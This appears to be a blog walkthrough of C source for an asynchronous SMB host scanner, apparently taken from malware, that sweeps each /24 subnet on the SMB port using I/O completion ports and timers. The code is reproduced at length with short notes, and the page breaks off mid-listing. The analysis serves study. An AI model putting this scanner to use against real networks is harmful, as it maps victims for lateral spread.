<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">CreateHostTable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&amp;g_SubnetList);</span><br><span class="line">	<span class="keyword">if</span> (!SubnetInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">	DWORD dwAddress;</span><br><span class="line">	RtlCopyMemory(bAddres, &amp;SubnetInfo-&gt;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (BYTE i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">		bAddres[<span class="number">3</span>] = i;</span><br><span class="line">		RtlCopyMemory(&amp;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, <span class="keyword">sizeof</span>(CONNECT_CONTEXT));</span><br><span class="line">		<span class="keyword">if</span> (!ConnectCtx) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ConnectCtx-&gt;dwAddres = dwAddress;</span><br><span class="line">		ConnectCtx-&gt;State = NOT_CONNECTED;</span><br><span class="line">		ConnectCtx-&gt;s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, WSA_FLAG_OVERLAPPED);</span><br><span class="line">		<span class="keyword">if</span> (ConnectCtx-&gt;s == INVALID_SOCKET) &#123;</span><br><span class="line"></span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, <span class="keyword">sizeof</span>(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = <span class="number">0</span>;</span><br><span class="line">		SockAddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pbind(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, <span class="keyword">sizeof</span>(SockAddr)) != ERROR_SUCCESS) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pCreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_REMOVE(&amp;g_SubnetList, SubnetInfo, Entries);</span><br><span class="line">	<span class="built_in">free</span>(SubnetInfo);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ScanHosts"><a href="#ScanHosts" class="headerlink" title="ScanHosts"></a>ScanHosts</h3><ul>
<li><p>ConnectEx</p>
<ul>
<li><p>The <strong>ConnectEx</strong> function establishes a connection to a specified socket, and optionally sends data once the connection is established. The <strong>ConnectEx</strong> function is only supported on connection-oriented sockets.</p>
<ul>
<li><p>&#96;&#96;&#96;<br>  LPFN_CONNECTEX LpfnConnectex;</p>
<p>  BOOL LpfnConnectex(<br>[in]           SOCKET s,<br>[in]           const sockaddr *name,<br>[in]           int namelen,<br>[in, optional] PVOID lpSendBuffer,<br>[in]           DWORD dwSendDataLength,<br>[out]          LPDWORD lpdwBytesSent,<br>[in]           LPOVERLAPPED lpOverlapped<br>  )<br>  {…}</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">VOID</span><br><span class="line">ScanHosts()</span><br><span class="line">&#123;</span><br><span class="line">	PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">	TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesSent;</span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, sizeof(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = htons(SMB_PORT);</span><br><span class="line">		SockAddr.sin_addr.s_addr = ConnectCtx-&gt;dwAddres;</span><br><span class="line"></span><br><span class="line">		if (g_ConnectEx(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, sizeof(SockAddr), NULL, 0, &amp;dwBytesSent, (LPOVERLAPPED)ConnectCtx)) &#123;</span><br><span class="line"></span><br><span class="line">			ConnectCtx-&gt;State = CONNECTED;</span><br><span class="line">			AddHost(ConnectCtx-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		else if (WSA_IO_PENDING == WSAGetLastError()) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations++;</span><br><span class="line">			ConnectCtx-&gt;State = CONNECTING;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="AddHost"><a href="#AddHost" class="headerlink" title="AddHost"></a>AddHost</h3><ul>
<li>add the new-found host to the Host table</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">AddHost</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in DWORD dwAddres</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (g_HostEntry) &#123;</span><br><span class="line">		INT i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (g_HostEntry-&gt;h_addr_list[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			DWORD dwCurrentAddr = *(DWORD*)g_HostEntry-&gt;h_addr_list[i++];</span><br><span class="line">			<span class="keyword">if</span> (dwCurrentAddr == dwAddres) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(<span class="keyword">sizeof</span>(HOST_INFO));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!HostInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwAddress = INET_ADDRSTRLEN;</span><br><span class="line">	SOCKADDR_IN temp;</span><br><span class="line">	temp.sin_addr.s_addr = dwAddres;</span><br><span class="line">	temp.sin_port = <span class="number">0</span>;</span><br><span class="line">	temp.sin_family = AF_INET;</span><br><span class="line">	HostInfo-&gt;dwAddres = dwAddres;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwAddres != STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&amp;temp, <span class="keyword">sizeof</span>(temp), <span class="literal">NULL</span>, HostInfo-&gt;wszAddress, &amp;dwAddres)) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(HostInfo);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pEnterCriticalSection(&amp;g_CriticalSection); &#123;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PortScanHandler"><a href="#PortScanHandler" class="headerlink" title="PortScanHandler"></a>PortScanHandler</h3><p>this handler use the <code>CompletionStatus,IsTimerActivated,g_ActiveOperations</code> to control the code flow.</p>
<ul>
<li>g_ActiveOperations<ul>
<li>use to count the Socket.</li>
<li><code>ScanHosts</code> function: when one host is found ,the value is add by one</li>
<li>if <code>CompletionStatus == CONNECT_COMPLETION_KEY</code>, the value sub by one.</li>
</ul>
</li>
<li>IsTimerActivated<ul>
<li>used to check after the timer.<ul>
<li>IsTimerActivated is True,</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>four scenes</p>
<ol>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect Success</p>
<ol>
<li><p>if g_ActiveOperations is zero ,then scanHost again</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<pre><code> if (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;
 
     ConnectContext-&gt;State = CONNECTED;
     AddHost(ConnectContext-&gt;dwAddres);
 
 &#125;
</code></pre>
</li>
</ol>
</li>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect fail</p>
<ol>
<li>the same as before</li>
</ol>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line"></span><br><span class="line">			ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>CompletionStatus &#x3D;&#x3D; TIMER_COMPLETION_KEY and g_ActiveOperations, so the connecting is Active.We can Cancel it now.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					if (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><code>CompletionStatus == TIMER_COMPLETION_KEY and  g_ActiveOperations == 0</code> , the socket is out-of-time.</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">				pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">				pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">				TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">				pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>CompletionStatus </p>
<ul>
<li>A pointer to a variable that receives the completion key value associated with the file handle whose I&#x2F;O operation has completed. A completion key is a per-file key that is specified in a call to <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/FileIO/createiocompletionport">CreateIoCompletionPort</a>.<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
</ul>
</li>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown or close the socket</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">PortScanHandler</span><span class="params">(PVOID pArg)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	HANDLE hTimer = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">	HANDLE hTimerQueue = pCreateTimerQueue();</span><br><span class="line">	<span class="keyword">if</span> (!hTimerQueue) &#123;</span><br><span class="line">		pExitThread(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesTransferred;</span><br><span class="line">		ULONG_PTR CompletionStatus;</span><br><span class="line">		PCONNECT_CONTEXT ConnectContext;</span><br><span class="line"></span><br><span class="line">		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &amp;dwBytesTransferred, &amp;CompletionStatus, (LPOVERLAPPED*)&amp;ConnectContext, INFINITE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (CompletionStatus == START_COMPLETION_KEY) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == CONNECT_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations--;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = CONNECTED;</span><br><span class="line">				AddHost(ConnectContext-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span 